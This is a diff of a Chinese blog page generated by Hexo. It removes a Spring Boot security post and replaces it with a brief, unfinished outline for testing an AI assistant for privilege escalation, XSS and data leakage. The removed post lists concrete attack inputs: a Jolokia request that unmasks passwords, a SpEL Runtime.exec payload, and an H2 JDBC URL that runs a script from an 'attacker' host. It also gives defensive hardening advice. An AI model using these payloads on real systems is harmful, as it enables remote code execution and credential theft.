@@ -21,27 +21,27 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="一、Spring Boot基础与安全机制1. Spring Boot定义 核心定位：Spring Boot是Spring生态的子项目，用于简化Spring应用的初始搭建和开发流程，提供自动化配置（@EnableAutoConfiguration）、内嵌服务器（Tomcat&#x2F;Jetty）和Starter依赖机制。 关键特性： 无XML配置，通过spring-boot-starter-*依">
+    <meta name="description" content="1-测试方案把ai当成用户进行测试 1-越权(通过ai助手可获得非本用户权限的数据) 2-xss(ai返回的数据会导致xss，本用户发过去的数据会导致xss) 3-泄露敏感信息(三要素) 待续">
 <meta property="og:type" content="article">
-<meta property="og:title" content="spring-boot详解">
-<meta property="og:url" content="http://example.com/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:title" content="关于ai助手的测试">
+<meta property="og:url" content="http://example.com/2026/02/04/%E5%85%B3%E4%BA%8Eai%E5%8A%A9%E6%89%8B%E7%9A%84%E6%B5%8B%E8%AF%95/index.html">
 <meta property="og:site_name" content="乌篷船的博客">
-<meta property="og:description" content="一、Spring Boot基础与安全机制1. Spring Boot定义 核心定位：Spring Boot是Spring生态的子项目，用于简化Spring应用的初始搭建和开发流程，提供自动化配置（@EnableAutoConfiguration）、内嵌服务器（Tomcat&#x2F;Jetty）和Starter依赖机制。 关键特性： 无XML配置，通过spring-boot-starter-*依">
+<meta property="og:description" content="1-测试方案把ai当成用户进行测试 1-越权(通过ai助手可获得非本用户权限的数据) 2-xss(ai返回的数据会导致xss，本用户发过去的数据会导致xss) 3-泄露敏感信息(三要素) 待续">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-05T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-06-06T02:15:16.987Z">
+<meta property="article:published_time" content="2026-02-04T03:45:19.000Z">
+<meta property="article:modified_time" content="2026-02-04T03:49:51.594Z">
 <meta property="article:author" content="乌篷船">
 <meta property="article:tag" content="article">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/">
+<link rel="canonical" href="http://example.com/2026/02/04/%E5%85%B3%E4%BA%8Eai%E5%8A%A9%E6%89%8B%E7%9A%84%E6%B5%8B%E8%AF%95/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/","path":"2025/06/06/spring-boot详解/","title":"spring-boot详解"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2026/02/04/%E5%85%B3%E4%BA%8Eai%E5%8A%A9%E6%89%8B%E7%9A%84%E6%B5%8B%E8%AF%95/","path":"2026/02/04/关于ai助手的测试/","title":"关于ai助手的测试"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>spring-boot详解 | 乌篷船的博客</title>
+<title>关于ai助手的测试 | 乌篷船的博客</title>
   
 
 
@@ -141,7 +141,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81Spring-Boot%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="nav-number">1.</span> <span class="nav-text">一、Spring Boot基础与安全机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Spring-Boot%E5%AE%9A%E4%B9%89"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">1. Spring Boot定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E7%BC%BA%E9%99%B7"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">2. 安全机制缺陷</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Spring-Boot%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.0.1.</span> <span class="nav-text">二、Spring Boot历史漏洞详解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%B1%BB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">1. 信息泄露类漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88RCE%EF%BC%89%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">2. 远程代码执行（RCE）漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E9%BB%91%E7%9B%92%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E6%A3%80%E6%9F%A5%E6%B8%85%E5%8D%95"><span class="nav-number">1.0.2.</span> <span class="nav-text">三、黑盒安全评估检查清单</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%B7%AF%E7%94%B1%E6%8E%A2%E6%B5%8B%E4%B8%8E%E7%89%88%E6%9C%AC%E8%AF%86%E5%88%AB"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">1. 路由探测与版本识别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%95%8F%E6%84%9F%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">2. 敏感端点检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">3. 漏洞利用验证流程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">1.0.3.</span> <span class="nav-text">四、防御建议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90"><span class="nav-number">1.0.4.</span> <span class="nav-text">五、学习资源</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#heapdump-tool"><span class="nav-number">1.0.4.0.0.1.</span> <span class="nav-text">heapdump_tool</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#SpringBoot-Scan"><span class="nav-number">1.0.4.0.0.2.</span> <span class="nav-text">SpringBoot-Scan</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Swagger-API-Exploit"><span class="nav-number">1.0.4.0.0.3.</span> <span class="nav-text">Swagger API Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E6%B5%8B%E8%AF%95%E6%96%B9%E6%A1%88"><span class="nav-number">1.</span> <span class="nav-text">1-测试方案</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -211,7 +211,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/04/%E5%85%B3%E4%BA%8Eai%E5%8A%A9%E6%89%8B%E7%9A%84%E6%B5%8B%E8%AF%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -224,12 +224,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="spring-boot详解 | 乌篷船的博客">
+      <meta itemprop="name" content="关于ai助手的测试 | 乌篷船的博客">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          spring-boot详解
+          关于ai助手的测试
         </h1>
 
         <div class="post-meta-container">
@@ -241,7 +241,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2025-06-06 00:00:00 / 修改时间：10:15:16" itemprop="dateCreated datePublished" datetime="2025-06-06T00:00:00+08:00">2025-06-06</time>
+      <time title="创建时间：2026-02-04 11:45:19 / 修改时间：11:49:51" itemprop="dateCreated datePublished" datetime="2026-02-04T11:45:19+08:00">2026-02-04</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -260,14 +260,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.8k</span>
+      <span>92</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>5 分钟</span>
+      <span>1 分钟</span>
     </span>
 </div>
 
@@ -277,192 +277,11 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><blockquote>
-<h1 id="一、Spring-Boot基础与安全机制"><a href="#一、Spring-Boot基础与安全机制" class="headerlink" title="一、Spring Boot基础与安全机制"></a><strong>一、Spring Boot基础与安全机制</strong></h1><h4 id="1-Spring-Boot定义"><a href="#1-Spring-Boot定义" class="headerlink" title="1. Spring Boot定义"></a>1. <strong>Spring Boot定义</strong></h4><ul>
-<li><strong>核心定位</strong>：Spring Boot是Spring生态的子项目，用于简化Spring应用的初始搭建和开发流程，提供自动化配置（<code>@EnableAutoConfiguration</code>）、内嵌服务器（Tomcat&#x2F;Jetty）和Starter依赖机制。</li>
-<li><strong>关键特性</strong>：<ul>
-<li>无XML配置，通过<code>spring-boot-starter-*</code>依赖自动装配组件。</li>
-<li>Actuator模块提供生产环境监控端点（如<code>/env</code>、<code>/health</code>），默认暴露敏感信息。</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-安全机制缺陷"><a href="#2-安全机制缺陷" class="headerlink" title="2. 安全机制缺陷"></a>2. <strong>安全机制缺陷</strong></h4><ul>
-<li><strong>默认暴露路由</strong>：Actuator端点未授权访问导致信息泄露。</li>
-<li><strong>配置不当</strong>：开发环境配置误用于生产环境（如Swagger、Actuator未关闭）。</li>
-<li><strong>依赖链风险</strong>：第三方库（如SnakeYAML、XStream）的反序列化漏洞被利用。</li>
-</ul>
-<span id="more"></span>
-
-<hr>
-<h3 id="二、Spring-Boot历史漏洞详解"><a href="#二、Spring-Boot历史漏洞详解" class="headerlink" title="二、Spring Boot历史漏洞详解"></a><strong>二、Spring Boot历史漏洞详解</strong></h3><h4 id="1-信息泄露类漏洞"><a href="#1-信息泄露类漏洞" class="headerlink" title="1. 信息泄露类漏洞"></a>1. <strong>信息泄露类漏洞</strong></h4><ul>
-<li><strong>敏感数据暴露</strong><ul>
-<li><p><strong>漏洞路径</strong>：<code>/env</code>、<code>/actuator/env</code> 泄露环境变量、数据库密码（部分脱敏字段可被绕过）16。</p>
-</li>
-<li><p><strong>脱敏绕过</strong>：通过Jolokia接口调用MBean获取星号（<code>******</code>）遮掩的密码明文：</p>
-</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jolokia</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;<span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;</span>, <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;getProperty&quot;</span>, <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;security.user.password&quot;</span>]&#125;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>接口详情泄露</strong><ul>
-<li><strong>Swagger路由</strong>：<code>/v2/api-docs</code>、<code>/swagger-ui.html</code> 暴露API文档及参数。</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-远程代码执行（RCE）漏洞"><a href="#2-远程代码执行（RCE）漏洞" class="headerlink" title="2. 远程代码执行（RCE）漏洞"></a>2. <strong>远程代码执行（RCE）漏洞</strong></h4><p>以下是12类核心RCE漏洞的对比与利用要点：</p>
-<table>
-<thead>
-<tr>
-<th align="left"><strong>漏洞名称</strong></th>
-<th align="left"><strong>利用条件</strong></th>
-<th align="left"><strong>利用方法</strong></th>
-<th align="left"><strong>关键路径</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><strong>Whitelabel Error Page SpEL</strong></td>
-<td align="left">Spring Boot 1.1.0-1.3.0</td>
-<td align="left">注入SpEL表达式：<code>$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)&#125;</code></td>
-<td align="left">触发错误页面的参数（如<code>?id=</code>)</td>
-</tr>
-<tr>
-<td align="left"><strong>Spring Cloud SnakeYAML RCE</strong></td>
-<td align="left">依赖<code>spring-cloud-starter</code></td>
-<td align="left">设置<code>spring.cloud.bootstrap.location</code>指向恶意YAML文件</td>
-<td align="left"><code>/env</code> + <code>/refresh</code></td>
-</tr>
-<tr>
-<td align="left"><strong>Eureka XStream反序列化</strong></td>
-<td align="left">使用Eureka服务发现</td>
-<td align="left">修改<code>eureka.client.serviceUrl.defaultZone</code>指向恶意XStream Payload</td>
-<td align="left"><code>/env</code> + <code>/refresh</code></td>
-</tr>
-<tr>
-<td align="left"><strong>Jolokia Logback JNDI</strong></td>
-<td align="left">Jolokia端点开放 + Logback依赖</td>
-<td align="left">通过<code>ch.qos.logback.classic.jmx.JMXConfigurator</code>加载远程恶意XML</td>
-<td align="left"><code>/jolokia</code> + <code>POST</code>请求</td>
-</tr>
-<tr>
-<td align="left"><strong>H2 Database Console JNDI</strong></td>
-<td align="left">启用H2 Console（默认<code>/h2-console</code>）</td>
-<td align="left">利用JDBC URL触发JNDI注入：<code>jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3/;INIT=RUNSCRIPT FROM &#39;http://attacker/exp.sql&#39;</code></td>
-<td align="left"><code>/h2-console</code>登录后的JDBC执行点</td>
-</tr>
-<tr>
-<td align="left"><strong>MySQL JDBC反序列化</strong></td>
-<td align="left">使用MySQL驱动 + 可外连</td>
-<td align="left">劫持JDBC连接至恶意MySQL服务器，发送Gadget链</td>
-<td align="left">修改<code>spring.datasource.url</code>属性</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>💡 <strong>利用链共性</strong>：多数RCE依赖Actuator的<code>/env</code>端点修改环境变量，并通过<code>/refresh</code>或<code>/restart</code>触发配置生效。</p>
-</blockquote>
-<hr>
-<h3 id="三、黑盒安全评估检查清单"><a href="#三、黑盒安全评估检查清单" class="headerlink" title="三、黑盒安全评估检查清单"></a><strong>三、黑盒安全评估检查清单</strong></h3><h4 id="1-路由探测与版本识别"><a href="#1-路由探测与版本识别" class="headerlink" title="1. 路由探测与版本识别"></a>1. <strong>路由探测与版本识别</strong></h4><ul>
-<li><strong>默认路由扫描</strong>：<ul>
-<li>Actuator 1.x根路径：<code>/env</code>、<code>/heapdump</code>。</li>
-<li>Actuator 2.x根路径：<code>/actuator/env</code>、<code>/actuator/heapdump</code>。</li>
-<li>自定义路径：尝试<code>/manage</code>、<code>/appenv</code>等常见替代路径。</li>
-</ul>
-</li>
-<li><strong>版本依赖关系</strong>：<br><strong>Spring Cloud与Boot版本兼容表</strong>：</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="left">Spring Cloud</th>
-<th align="left">Spring Boot</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Edgware</td>
-<td align="left">1.5.x (不兼容2.x)</td>
-</tr>
-<tr>
-<td align="left">Finchley</td>
-<td align="left">2.0.x</td>
-</tr>
-<tr>
-<td align="left">Hoxton</td>
-<td align="left">2.2.x-2.3.x</td>
-</tr>
-</tbody></table>
-<h4 id="2-敏感端点检测"><a href="#2-敏感端点检测" class="headerlink" title="2. 敏感端点检测"></a>2. <strong>敏感端点检测</strong></h4><ul>
-<li><strong>高风险端点</strong>：</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/env            # 环境变量与配置</span><br><span class="line">/jolokia/list   # 列出所有MBean</span><br><span class="line">/heapdump       # 下载堆内存快照（含敏感数据）</span><br><span class="line">/trace          # 查看HTTP请求记录（含Cookie）</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>信息泄露验证</strong>：<br>检查<code>/v2/api-docs</code>是否返回API JSON结构；访问<code>/swagger-ui.html</code>确认接口详情。</li>
-</ul>
-<h4 id="3-漏洞利用验证流程"><a href="#3-漏洞利用验证流程" class="headerlink" title="3. 漏洞利用验证流程"></a>3. <strong>漏洞利用验证流程</strong></h4><ol>
-<li><strong>信息收集</strong>：<ul>
-<li>访问<code>/env</code>搜索<code>password</code>、<code>secret</code>等关键词。</li>
-<li>检查<code>******</code>字段，尝试Jolokia明文提取。</li>
-</ul>
-</li>
-<li><strong>RCE触发</strong>：<ul>
-<li>修改环境变量（如<code>spring.datasource.url</code>注入恶意JDBC）。</li>
-<li>调用<code>/refresh</code>或<code>/restart</code>生效配置。</li>
-</ul>
-</li>
-<li><strong>内存分析</strong>：<ul>
-<li>下载<code>/heapdump</code>，使用MAT工具分析内存中的密码明文。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h3 id="四、防御建议"><a href="#四、防御建议" class="headerlink" title="四、防御建议"></a><strong>四、防御建议</strong></h3><ol>
-<li><strong>端点管控</strong>：<ul>
-<li>生产环境关闭Actuator或通过<code>management.endpoints.web.exposure.include</code>限制暴露端点。</li>
-</ul>
-</li>
-<li><strong>依赖安全</strong>：<ul>
-<li>避免使用有漏洞的组件（如XStream &lt; 1.4.17、SnakeYAML &lt; 1.31）。</li>
-</ul>
-</li>
-<li><strong>配置加固</strong>：<ul>
-<li>重命名敏感端点路径（如<code>management.endpoints.web.path-mapping.env=internal-env</code>）。</li>
-<li>启用Spring Security对Actuator端点鉴权。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h3 id="五、学习资源"><a href="#五、学习资源" class="headerlink" title="五、学习资源"></a><strong>五、学习资源</strong></h3><ol>
-<li><p><strong>漏洞项目</strong>：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">LandGrey&#x2F;SpringBootVulExploit</a>：含漏洞环境与PoC。</li>
-</ul>
-</li>
-<li><p><strong>深度分析</strong>：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://cloud.tencent.cn/developer/article/2278104">Spring {Boot, Data, Security}历史漏洞研究</a>：漏洞原理与调试方法。</li>
-</ul>
-</li>
-<li><p><strong>实验环境</strong>：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/spring/spring-boot-actuator">vulhub&#x2F;spring-boot-actuator</a></li>
-</ul>
-</li>
-<li><p><strong>推荐工具</strong>：</p>
-<ol>
-<li><h6 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a><a target="_blank" rel="noopener" href="https://www.aliyundrive.com/s/GapNjP3a9Rx">heapdump_tool</a></h6></li>
-<li><h6 id="SpringBoot-Scan"><a href="#SpringBoot-Scan" class="headerlink" title="SpringBoot-Scan"></a><a target="_blank" rel="noopener" href="https://gitcode.com/AabyssZG/SpringBoot-Scan">SpringBoot-Scan</a></h6></li>
-<li><h6 id="Swagger-API-Exploit"><a href="#Swagger-API-Exploit" class="headerlink" title="Swagger API Exploit"></a><a target="_blank" rel="noopener" href="https://github.com/lijiejie/swagger-exp">Swagger API Exploit</a></h6></li>
-</ol>
-</li>
-<li><p><strong>常见案列</strong>：</p>
-<ol>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/yunli0/article/details/117817987">10个Spring Boot 优秀学习项目_springboot项目</a></li>
-</ol>
-</li>
-</ol>
-<p>此框架覆盖了Spring Boot漏洞的核心场景，从原理到实践形成闭环，可作为渗透测试和安全加固的标准化参考。</p>
-</blockquote>
+    <div class="post-body" itemprop="articleBody"><h1 id="1-测试方案"><a href="#1-测试方案" class="headerlink" title="1-测试方案"></a>1-测试方案</h1><p><code>把ai当成用户进行测试</code></p>
+<p>1-越权(通过ai助手可获得非本用户权限的数据)</p>
+<p>2-<code>xss</code>(ai返回的数据会导致xss，本用户发过去的数据会导致xss)</p>
+<p>3-泄露敏感信息(三要素)</p>
+<p><code>待续</code></p>
 
     </div>
 
@@ -479,14 +298,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2025/06/05/Guid-v1%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/" rel="prev" title="Guid-v1参数">
-                  <i class="fa fa-angle-left"></i> Guid-v1参数
+                <a href="/2026/01/30/next%E5%AD%A6%E4%B9%A0%E8%A7%84%E5%88%92/" rel="prev" title="next学习规划">
+                  <i class="fa fa-angle-left"></i> next学习规划
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2025/06/13/%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E7%9A%84%E6%B8%97%E9%80%8F/" rel="next" title="关于微信的渗透">
-                  关于微信的渗透 <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
